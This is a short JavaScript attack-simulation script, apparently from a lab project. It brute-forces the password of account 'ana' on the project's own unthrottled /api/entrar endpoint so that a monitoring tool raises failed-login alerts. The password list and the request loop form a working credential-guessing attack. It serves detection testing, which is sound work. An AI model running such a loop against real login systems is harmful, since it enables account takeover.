// npm run ataque:forca-bruta: um IP tentando senhas na conta "ana" até
// acertar. O login não tem limite de tentativas, e o Omni acusa "Logins
// falhos por IP" e "Logins falhos por conta" (10/min amarelo, 30/min vermelho).
//   --conta ana
//   --taxa 3      tentativas por segundo

import { args, basic, flood, send } from '../lib.js'

const o = args({ conta: 'ana', taxa: 3 })
const ip = '203.0.113.66'
// Lista de senhas comuns, com a senha certa da ana perto do fim.
const comuns = ['123456', 'senha', '12345678', 'qwerty', 'abc123', 'brasil', 'senha123', '111111', 'admin', 'iloveyou']
const senhas = []
for (let i = 0; i < 180; i++) senhas.push(i < comuns.length ? comuns[i] : `${o.conta}${1900 + i}`)
senhas.splice(170, 0, `${o.conta}123`)

let found = null
console.log(`força bruta: ${senhas.length} senhas na conta ${o.conta}, de ${ip}, a ${o.taxa}/s. Ctrl+C para parar.`)
await flood({
  name: 'forca-bruta',
  rate: o.taxa,
  duration: 0,
  next: (i) => (i < senhas.length && !found ? send('/api/entrar', { method: 'POST', ip, auth: basic(o.conta, senhas[i]) }).then((r) => ({ ...r, senha: senhas[i] })) : null),
  onResult: (r) => {
    if (r.status === 200) {
      found = r.senha
      return false
    }
  },
})
console.log(found ? `\nSENHA ENCONTRADA: ${o.conta} / ${found}` : '\nnenhuma senha da lista funcionou')
